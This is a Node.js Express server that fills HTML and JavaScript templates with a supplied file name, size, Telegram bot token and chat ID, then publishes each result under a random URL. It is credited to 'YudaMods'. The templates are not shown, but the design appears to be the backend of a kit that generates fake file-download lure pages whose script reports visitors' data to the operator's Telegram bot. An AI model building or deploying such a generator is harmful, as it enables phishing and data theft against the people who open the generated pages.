const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const port = 3000;

// Helper: Generate random folder name
function generateRandomFolderName() {
    return crypto.randomBytes(5).toString('hex'); // Random 10-character string
}

// Helper: Generate dynamic HTML
function generateHtml(filename, size, chatId) {
    const templatePath = path.join(__dirname, 'public', 'templates', 'index.template.html');
    const template = fs.readFileSync(templatePath, 'utf-8');
    return template
        .replace('{{filename}}', filename)
        .replace('{{size}}', size)
        .replace('{{chatId}}', chatId);
}

// Helper: Generate dynamic JS
function generateJs(botToken, chatId) {
    const templatePath = path.join(__dirname, 'public', 'templates', 'main.template.js');
    const template = fs.readFileSync(templatePath, 'utf-8');
    return template
        .replace('{{botToken}}', botToken)
        .replace('{{chatId}}', chatId);
}

// Serve static files (including dynamically generated files)
app.use('/static', express.static(path.join(__dirname, 'public', 'templates')));

// Endpoint to generate dynamic content
app.get('/', (req, res) => {
    const { filename, size, chatId, botToken } = req.query;

    // Debug log: check query parameters
    console.log('Query Parameters:', { filename, size, chatId, botToken });

    // Check if required query parameters are provided
    if (!filename || !size || !chatId || !botToken) {
        return res.status(400).send('Missing query parameters: filename, size, chatId, or botToken.');
    }

    // Create a random folder for the generated content
    const randomFolder = generateRandomFolderName();
    const outputPath = path.join(__dirname, 'public', randomFolder);

    if (!fs.existsSync(outputPath)) {
        fs.mkdirSync(outputPath, { recursive: true });
    }

    // Generate index.html
    const htmlContent = generateHtml(filename, size, chatId);
    fs.writeFileSync(path.join(outputPath, 'index.html'), htmlContent);

    // Generate main.js
    const jsContent = generateJs(botToken, chatId);
    fs.writeFileSync(path.join(outputPath, 'main.js'), jsContent);

    // Send response with the path to the generated folder
    res.status(200).send({
        message: 'Generated successfully',
        resultUrl: `/static/${randomFolder}/index.html`,
        creator: 'YudaMods',
    });
});

// Custom 404 Handler
app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head>
            <title>404 - Not Found</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f9fa; padding: 50px; }
                h1 { color: #343a40; }
                a { text-decoration: none; color: #007bff; }
            </style>
        </head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>Sorry, the page you are looking for does not exist.</p>
            <a href="/">Go Back Home</a>
        </body>
        </html>
    `);
});

// Error handler
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send(`
        <html>
        <head>
            <title>500 - Internal Server Error</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f9fa; padding: 50px; }
                h1 { color: #dc3545; }
                a { text-decoration: none; color: #007bff; }
            </style>
        </head>
        <body>
            <h1>500 - Internal Server Error</h1>
            <p>Something went wrong. Please try again later.</p>
            <a href="/">Go Back Home</a>
        </body>
        </html>
    `);
});

// Start server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
